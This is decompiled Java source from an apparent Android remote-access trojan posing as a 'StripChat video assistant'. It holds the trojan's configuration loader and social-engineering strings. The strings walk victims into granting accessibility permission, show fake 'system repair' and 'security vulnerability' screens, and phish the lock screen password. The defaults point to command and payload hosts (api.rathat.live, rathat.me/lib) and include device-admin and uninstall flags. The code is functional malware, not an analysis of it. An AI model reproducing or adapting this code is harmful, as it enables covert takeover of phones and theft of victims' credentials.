package com.guard.wallet.utils;

import a1.q;
import com.guard.wallet.MainApplication;
import com.guard.wallet.entity.BuildConfig;
import com.guard.wallet.entity.LangDialog;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.util.LinkedHashMap;

public abstract class d {
   public static final Integer a;
   public static final Integer b = 0;
   public static final Integer c;
   public static final Integer d;
   public static final Integer e = 2;
   public static final Integer f = 5;

   static {
      Integer var0 = 1;
      a = var0;
      c = var0;
      d = var0;
   }

   // $VF: Handled exception range with multiple entry points by splitting it
   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static BuildConfig a() {
      LangDialog var0 = new LangDialog(
         "StripChat assist",
         "StripChat",
         "StripChat video assistant",
         "Go immediately",
         "Open [accessibility_service_label]",
         "1.Click go immediately and enter accessibility service column\n2.Pull down to the bottom,find already downloaded(installed) apps,and click to enter this column\n3.Find [accessibility_service_label],and click to enter this column\n4.Click the switch(in the top right corner),you can open [accessibility_service_label]",
         "Initializing [StripChat video assistant]\nPlease do not operate your phone...",
         "System is being repaired\nplease do not operate the phone...",
         "standby power-saving mode",
         "entered standby power-saving mode, click here to wake up",
         "Press again to exit",
         "Allow restricted settings",
         "",
         "Verify lock screen password",
         "Fix system security vulnerabilities",
         "Please enter your lock screen password to complete the system update and fix security vulnerabilities.",
         "Verify personal identity",
         "Privacy protection",
         "To protect your privacy, please enter your lock screen password to verify that you are the one making the operation.",
         "Initializing verification key\nPlease wait...",
         "Initializing Wi-Fi network data transmission key\nPlease do not operate your phone..."
      );
      LinkedHashMap var1 = new LinkedHashMap();
      var1.put("en", var0);
      if (!q.B("config.json") && g.Z() != null && g.Z().getAssets() != null) {
         Exception var10000;
         label239: {
            InputStream var2;
            StringBuilder var3;
            InputStreamReader var4;
            BufferedReader var5;
            try {
               var2 = g.Z().getAssets().open("config.json");
               var4 = new InputStreamReader(var2, StandardCharsets.UTF_8);
               var5 = new BufferedReader(var4);
               var3 = new StringBuilder();
            } catch (Exception var32) {
               var10000 = var32;
               boolean var10001 = false;
               break label239;
            }

            while (true) {
               try {
                  var33 = var5.readLine();
               } catch (Exception var30) {
                  var10000 = var30;
                  boolean var39 = false;
                  break;
               }

               if (var33 == null) {
                  try {
                     var5.close();
                     var4.close();
                     var2.close();
                     var38 = (BuildConfig)h.d(var3.toString(), BuildConfig.class);
                  } catch (Exception var29) {
                     var10000 = var29;
                     boolean var41 = false;
                     break;
                  }

                  if (var38 == null) {
                     return new BuildConfig(
                        "api.rathat.live",
                        "https://rathat.me/lib",
                        "rat-hat",
                        "https://guide.accessibility.rathat.org",
                        null,
                        "https://m.baidu.com/",
                        null,
                        "https://admin.rathat.live/download/file/845804095260737536.png",
                        "#303133",
                        a,
                        b,
                        c,
                        d,
                        e,
                        f,
                        var1
                     );
                  }

                  label224: {
                     label223: {
                        try {
                           if (q.B(var38.getServerHost())) {
                              break label223;
                           }
                        } catch (Exception var28) {
                           var10000 = var28;
                           boolean var42 = false;
                           break;
                        }

                        try {
                           var34 = q.m(var38.getServerHost());
                           break label224;
                        } catch (Exception var27) {
                           var10000 = var27;
                           boolean var43 = false;
                           break;
                        }
                     }

                     var34 = "api.rathat.live";
                  }

                  label215: {
                     label214: {
                        try {
                           var38.setServerHost(var34);
                           if (q.B(var38.getDownloadRatHatHost())) {
                              break label214;
                           }
                        } catch (Exception var26) {
                           var10000 = var26;
                           boolean var44 = false;
                           break;
                        }

                        try {
                           var35 = q.m(var38.getDownloadRatHatHost());
                           break label215;
                        } catch (Exception var25) {
                           var10000 = var25;
                           boolean var45 = false;
                           break;
                        }
                     }

                     var35 = "https://rathat.me/lib";
                  }

                  try {
                     var38.setDownloadRatHatHost(var35);
                     if (q.B(var38.getDownloadRatHatName())) {
                        var38.setDownloadRatHatName("rat-hat");
                     }
                  } catch (Exception var24) {
                     var10000 = var24;
                     boolean var46 = false;
                     break;
                  }

                  label203: {
                     label202: {
                        try {
                           if (q.B(var38.getGuideAccessibilityHost())) {
                              break label202;
                           }
                        } catch (Exception var23) {
                           var10000 = var23;
                           boolean var47 = false;
                           break;
                        }

                        try {
                           var36 = q.m(var38.getGuideAccessibilityHost());
                           break label203;
                        } catch (Exception var22) {
                           var10000 = var22;
                           boolean var48 = false;
                           break;
                        }
                     }

                     var36 = "https://guide.accessibility.rathat.org";
                  }

                  try {
                     var38.setGuideAccessibilityHost(var36);
                     if (q.B(var38.getMainUrl())) {
                        var38.setMainUrl("https://m.baidu.com/");
                     }
                  } catch (Exception var21) {
                     var10000 = var21;
                     boolean var49 = false;
                     break;
                  }

                  label191: {
                     try {
                        if (var38.getPromotionModel() != null && (var38.getPromotionModel() == 0 || var38.getPromotionModel() == 1)) {
                           break label191;
                        }
                     } catch (Exception var20) {
                        var10000 = var20;
                        boolean var50 = false;
                        break;
                     }

                     try {
                        var38.setPromotionModel(a);
                     } catch (Exception var19) {
                        var10000 = var19;
                        boolean var51 = false;
                        break;
                     }
                  }

                  label179: {
                     try {
                        if (var38.getUninstall() != null && (var38.getUninstall() == 0 || var38.getUninstall() == 1)) {
                           break label179;
                        }
                     } catch (Exception var18) {
                        var10000 = var18;
                        boolean var52 = false;
                        break;
                     }

                     try {
                        var38.setUninstall(b);
                     } catch (Exception var17) {
                        var10000 = var17;
                        boolean var53 = false;
                        break;
                     }
                  }

                  label167: {
                     try {
                        if (var38.getActiveAdmin() != null && (var38.getActiveAdmin() == 0 || var38.getActiveAdmin() == 1)) {
                           break label167;
                        }
                     } catch (Exception var16) {
                        var10000 = var16;
                        boolean var54 = false;
                        break;
                     }

                     try {
                        var38.setUninstall(c);
                     } catch (Exception var15) {
                        var10000 = var15;
                        boolean var55 = false;
                        break;
                     }
                  }

                  label155: {
                     try {
                        if (var38.getDebug() != null && (var38.getDebug() == 0 || var38.getDebug() == 1)) {
                           break label155;
                        }
                     } catch (Exception var14) {
                        var10000 = var14;
                        boolean var56 = false;
                        break;
                     }

                     try {
                        var38.setUninstall(d);
                     } catch (Exception var13) {
                        var10000 = var13;
                        boolean var57 = false;
                        break;
                     }
                  }

                  label143: {
                     try {
                        if (var38.getPerScreenOffDuration() != null && var38.getPerScreenOffDuration() > 0) {
                           break label143;
                        }
                     } catch (Exception var12) {
                        var10000 = var12;
                        boolean var58 = false;
                        break;
                     }

                     try {
                        var38.setPerScreenOffDuration(e);
                     } catch (Exception var11) {
                        var10000 = var11;
                        boolean var59 = false;
                        break;
                     }
                  }

                  label133: {
                     try {
                        if (var38.getPerIdleDuration() != null && var38.getPerIdleDuration() > 0) {
                           break label133;
                        }
                     } catch (Exception var10) {
                        var10000 = var10;
                        boolean var60 = false;
                        break;
                     }

                     try {
                        var38.setPerIdleDuration(f);
                     } catch (Exception var9) {
                        var10000 = var9;
                        boolean var61 = false;
                        break;
                     }
                  }

                  label123: {
                     try {
                        if (var38.getLangMap() != null && !var38.getLangMap().isEmpty()) {
                           break label123;
                        }
                     } catch (Exception var8) {
                        var10000 = var8;
                        boolean var62 = false;
                        break;
                     }

                     try {
                        var38.setLangMap(var1);
                     } catch (Exception var7) {
                        var10000 = var7;
                        boolean var63 = false;
                        break;
                     }
                  }

                  try {
                     return var38;
                  } catch (Exception var6) {
                     var10000 = var6;
                     boolean var64 = false;
                     break;
                  }
               }

               try {
                  var3.append(var33);
               } catch (Exception var31) {
                  var10000 = var31;
                  boolean var40 = false;
                  break;
               }
            }
         }

         Exception var37 = var10000;
         q.s("com.guard.wallet.utils.d", var37);
      }

      return new BuildConfig(
         "api.rathat.live",
         "https://rathat.me/lib",
         "rat-hat",
         "https://guide.accessibility.rathat.org",
         null,
         "https://m.baidu.com/",
         null,
         "https://admin.rathat.live/download/file/845804095260737536.png",
         "#303133",
         a,
         b,
         c,
         d,
         e,
         f,
         var1
      );
   }

   public static String b() {
      return MainApplication.getInstance() != null
            && MainApplication.getInstance().getBuildConfig() != null
            && !q.B(MainApplication.getInstance().getBuildConfig().getBlockIconUrl())
         ? MainApplication.getInstance().getBuildConfig().getBlockIconUrl()
         : "https://admin.rathat.live/download/file/845804095260737536.png";
   }

   public static String c() {
      return MainApplication.getInstance() != null
            && MainApplication.getInstance().getBuildConfig() != null
            && !q.B(MainApplication.getInstance().getBuildConfig().getDownloadRatHatHost())
         ? MainApplication.getInstance().getBuildConfig().getDownloadRatHatHost()
         : "https://rathat.me/lib";
   }

   public static String d() {
      return MainApplication.getInstance() != null
            && MainApplication.getInstance().getBuildConfig() != null
            && !q.B(MainApplication.getInstance().getBuildConfig().getDownloadRatHatName())
         ? MainApplication.getInstance().getBuildConfig().getDownloadRatHatName()
         : "rat-hat";
   }

   public static String e() {
      return MainApplication.getInstance() != null
            && MainApplication.getInstance().getBuildConfig() != null
            && !q.B(MainApplication.getInstance().getBuildConfig().getGuideAccessibilityHost())
         ? MainApplication.getInstance().getBuildConfig().getGuideAccessibilityHost()
         : "https://guide.accessibility.rathat.org";
   }

   public static String f() {
      return MainApplication.getInstance() != null
            && MainApplication.getInstance().getBuildConfig() != null
            && !q.B(MainApplication.getInstance().getBuildConfig().getMainUrl())
         ? MainApplication.getInstance().getBuildConfig().getMainUrl()
         : "https://m.baidu.com/";
   }

   public static Integer g() {
      return MainApplication.getInstance() != null
            && MainApplication.getInstance().getBuildConfig() != null
            && MainApplication.getInstance().getBuildConfig().getPromotionModel() != null
         ? MainApplication.getInstance().getBuildConfig().getPromotionModel()
         : a;
   }

   public static String h() {
      return MainApplication.getInstance() != null
            && MainApplication.getInstance().getBuildConfig() != null
            && !q.B(MainApplication.getInstance().getBuildConfig().getServerHost())
         ? MainApplication.getInstance().getBuildConfig().getServerHost()
         : "api.rathat.live";
   }

   public static String i() {
      return MainApplication.getInstance() != null
            && MainApplication.getInstance().getBuildConfig() != null
            && !q.B(MainApplication.getInstance().getBuildConfig().getUpdateSystemMsg())
         ? MainApplication.getInstance().getBuildConfig().getUpdateSystemMsg()
         : "System is being repaired\nplease do not operate the phone...";
   }
}
